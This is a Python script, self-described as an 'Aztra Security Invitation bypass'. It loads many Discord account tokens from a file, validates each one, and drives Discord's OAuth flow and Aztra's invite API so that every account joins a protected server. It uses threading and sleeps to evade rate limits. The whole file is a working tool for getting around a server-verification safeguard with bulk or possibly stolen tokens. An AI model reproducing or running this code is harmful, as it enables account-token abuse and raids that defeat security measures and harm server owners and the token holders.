# import
import os
import re
import threading
import time
try:
    import requests as req
except:
    os.system("pip install requests")
    import requests as req

# main
def main():
    threads = []
    c = 0

    banner()

    link = input("Aztra Invite Link>>> ")
    if isInvite(link):
        with open('tokens.txt','r') as _tokens:
            tokens = _tokens.readlines()
            for token in tokens:
                token = token.rstrip()
                try:
                    token = token.split(":")[2]
                except:
                    pass
                if isToken(token):
                    def JOIN(_token):
                        try:
                            InviteId = getInviteId(link)
                            Invite_token = getInviteToken(getCode(_token), InviteId)

                            result = JoinUser(Invite_token, InviteId)

                            if result:
                                print("\x1b[32m"+"Token join success: "+_token+"\x1b[0m")
                            else:
                                print("\x1b[31m"+"Token join failed: "+_token+"\x1b[0m")
                        except Exception as e:
                            print("\x1b[31mERROR - {}\x1b[0m\n ⌞{}".format(_token, e))

                    t = threading.Thread(target=JOIN, args=(token,))
                    threads.append(t)
                    t.start()
                    c += 1

                    if c % 6 == 0: // Rate limit 방지
                        time.sleep(4)
                else:
                    print("\x1b[33m"+"Invalid Discord Token: "+token+"\x1b[0m")

            for x in threads:
                x.join()
            print("\x1b[34m"+"All valid tokens have joined!"+"\x1b[0m")
    else:
        print("Invalid Invite URL")

# function
def isToken(_token):
    res = req.get('https://discord.com/api/v9/users/@me/library', headers={'content-type': 'application/json', "authorization": _token})
    if res.status_code == 200:
        return True
    else:
        return False
def isInvite(_link):
    regex = re.compile(r"(https?:\/\/)?(aztra.xyz\/invite\/\w{8})")
    if regex.match(_link) != None:
        return True
    else:
        return False
def getCode(_token):
    res = req.post('https://discord.com/api/v9/oauth2/authorize?client_id=751339721782722570&response_type=code&redirect_uri=https://aztra.xyz/invite/auth&scope=identify guilds.join', headers={'content-type': 'application/json', "authorization": _token, 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.151 Whale/3.14.134.62 Safari/537.36"}, json={"authorize": True, "permissions": "0"})
    redirect_url = res.json()['location']
    return redirect_url.split('?code=')[1]
def getInviteToken(_code, _inviteId):
    res = req.get('https://api.aztra.xyz/oauth2/invite_token?invite={}&code={}'.format(_inviteId, _code))
    inviteToken = res.json()['inviteToken']
    return inviteToken
def JoinUser(_inviteToken, InviteId):
    res = req.post('https://api.aztra.xyz/invites/{0}/join'.format(InviteId), headers={'Content-Type': 'application/json; charset=utf-8', 'Invite-Token': _inviteToken, 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.151 Whale/3.14.134.62 Safari/537.36"})
    if res.status_code == 201 or res.status_code == 204:
        return True
    else:
        print("\x1b[31m ⌜REASON: {} | {}".format(str(res.status_code), res.json()['message'])+"\x1b[0m")
        return False
def getInviteId(_link):
    return _link[-8:]
def banner():
    os.system("title Aztra Security Invitation bypassㅣHughes#0001")
    print('\033[95m' + """ _______                            _______    _                     _______    _                   
(_______)        _                 (_______)  | |                   (_______)  (_)                  
 _______ _____ _| |_  ____ _____       _  ___ | |  _ _____ ____         _  ___  _ ____  _____  ____ 
|  ___  (___  |_   _)/ ___|____ |     | |/ _ \| |_/ ) ___ |  _ \    _  | |/ _ \| |  _ \| ___ |/ ___)
| |   | |/ __/  | |_| |   / ___ |     | | |_| |  _ (| ____| | | |  | |_| | |_| | | | | | ____| |    
|_|   |_(_____)  \__)_|   \_____|     |_|\___/|_| \_)_____)_| |_|   \___/ \___/|_|_| |_|_____)_|    
No Proxy                                                                        
                                                                        Developed by Hughes#0001""" + '\033[0m')

# start
if __name__ == "__main__":
    main()
    os.system("pause")
